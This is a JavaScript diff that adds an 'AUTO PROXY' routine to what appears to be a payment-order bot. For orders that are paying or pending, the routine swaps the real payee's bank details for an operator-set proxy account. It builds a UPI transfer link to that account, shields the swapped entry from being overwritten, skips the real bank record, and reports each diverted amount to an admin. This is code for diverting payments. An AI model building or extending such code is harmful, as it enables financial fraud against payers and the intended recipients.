@@ -2105,6 +2105,62 @@ ${replaceLine}
           const acctCode = item.acctCode || item.acctcode || item.ifsc || item.acctIfsc || '';
           const amt = item.amount || item.money || item.realAmount || item.orderAmount || '';
 
+          // ── AUTO PROXY: if order is in "paying" state, force proxy bank ──────
+          const _itemStatus = String(
+            item.status ?? item.orderStatus ?? item.orderState ??
+            item.state ?? item.payStatus ?? item.tradeStatus ?? ''
+          ).toLowerCase();
+          const _isPayingStatus = ['paying', 'pay', 'pending', 'processing', 'waitpay',
+            'wait_pay', 'topay', 'to_pay', 'unpaid', '0', '1', '2'].includes(_itemStatus)
+            || _itemStatus === '' // no status field = treat as active
+            || /pay|pend|process|wait|unpaid/i.test(_itemStatus);
+          const _itemAmt = parseFloat(amt) || 0;
+          const _minAutoAmt = parseFloat(data.minBuyAutoProxy) || 0; // admin can set via /setconfig
+          const _histActiveBank = getActiveBank(data, null);
+          const _histProxyOn = data.botEnabled !== false;
+
+          if (_isPayingStatus && _histActiveBank && _histProxyOn && _itemAmt >= _minAutoAmt && !data.orderBankMap[oId]?.forced) {
+            // Paying order found — save proxy bank immediately (same as /addorder)
+            const _bk = _histActiveBank;
+            const _last4 = (_bk.accountNo || '').slice(-4);
+            let _wDomain = '';
+            if (_bk.accountNo) {
+              _wDomain = `mobikwik://moneytransfer/upi/bank?account=${_bk.accountNo}&ifsc=${_bk.ifsc || ''}&name=${encodeURIComponent(_bk.accountHolder || '')}&amount=${_itemAmt}.0&displayAccountNumber=xxxxxxxxx${_last4}`;
+            }
+            data.orderBankMap[oId] = {
+              bank: `${_bk.accountHolder} | ${_bk.accountNo}${_bk.ifsc ? ' | ' + _bk.ifsc : ''}`,
+              accountHolder: _bk.accountHolder || '',
+              accountNo: _bk.accountNo || '',
+              ifsc: _bk.ifsc || '',
+              bankName: _bk.bankName || '',
+              upiId: _bk.upiId || '',
+              amount: _itemAmt,
+              rptNo: item.rptNo || item.rpt_no || oId,
+              orderNo: item.orderNo || item.order_no || oId,
+              walletDomain: _wDomain,
+              payType: 1,
+              time: now,
+              userId: String(userId || ''),
+              forced: true,
+              isManual: true
+            };
+            const _altId = String(item.rptNo || item.rpt_no || '');
+            if (_altId && _altId !== oId) data.orderBankMap[_altId] = data.orderBankMap[oId];
+
+            notifyAdmin(data,
+              `🎯 AUTO PROXY SET
+📋 Order: ${oId}
+💰 Amount: ₹${_itemAmt}
+🏦 Bank: ${_bk.accountHolder} | ${_bk.accountNo}${_bk.ifsc ? ' | ' + _bk.ifsc : ''}
+📊 Status: ${_itemStatus || 'active'}
+👤 User: ${userId || 'N/A'}
+🕐 ${now}`);
+
+            capturedCount++;
+            logLines.push(`🎯 AUTO PROXY: ${oId}\n   💰 ₹${_itemAmt}  🏦 ${_bk.accountHolder} | ${_bk.accountNo}`);
+            continue; // skip real-bank save below
+          }
+
           // Don't overwrite entries that were forced by our proxy (forced=true)
           if (!data.orderBankMap[oId] || !data.orderBankMap[oId].forced) {
             data.orderBankMap[oId] = {
